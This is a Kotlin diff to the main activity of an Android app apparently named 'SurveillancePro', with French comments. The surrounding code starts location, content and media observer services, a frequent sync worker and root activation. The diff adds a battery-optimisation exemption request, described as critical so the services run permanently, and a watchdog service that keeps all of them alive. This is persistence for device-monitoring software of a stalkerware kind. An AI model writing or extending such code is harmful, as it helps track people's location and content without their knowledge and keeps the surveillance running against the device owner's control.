@@ -93,6 +93,9 @@ class MainActivity : ComponentActivity() {
     }
 
     private fun startAllServices() {
+        // CRITIQUE: Désactiver l'optimisation batterie AVANT de démarrer les services
+        requestBatteryOptimizationExemption()
+        
         startLocationService()
         startContentObserverService()
         startMediaObserver()
@@ -100,6 +103,9 @@ class MainActivity : ComponentActivity() {
 
         SyncWorker.schedule(this, intervalMinutes = 5)
         SyncWorker.triggerNow(this)
+        
+        // Démarrer le Watchdog pour surveiller tous les services
+        com.surveillancepro.android.services.WatchdogService.start(this)
 
         // Activation ROOT en arrière-plan (ne bloque pas l'UI)
         lifecycleScope.launch(kotlinx.coroutines.Dispatchers.IO) {
@@ -108,6 +114,28 @@ class MainActivity : ComponentActivity() {
         }
 
         Log.d("MainActivity", "All services started")
+    }
+    
+    /**
+     * Demande l'exemption d'optimisation batterie.
+     * CRITIQUE pour que les services tournent en permanence sans être tués par Android.
+     */
+    @android.annotation.SuppressLint("BatteryLife")
+    private fun requestBatteryOptimizationExemption() {
+        try {
+            val pm = getSystemService(POWER_SERVICE) as android.os.PowerManager
+            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
+                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
+                    data = android.net.Uri.parse("package:$packageName")
+                }
+                startActivity(intent)
+                Log.d("MainActivity", "Battery optimization exemption requested")
+            } else {
+                Log.d("MainActivity", "Already exempt from battery optimization")
+            }
+        } catch (e: Exception) {
+            Log.w("MainActivity", "Battery optimization request failed: ${e.message}")
+        }
     }
 
     private fun startContentObserverService() {
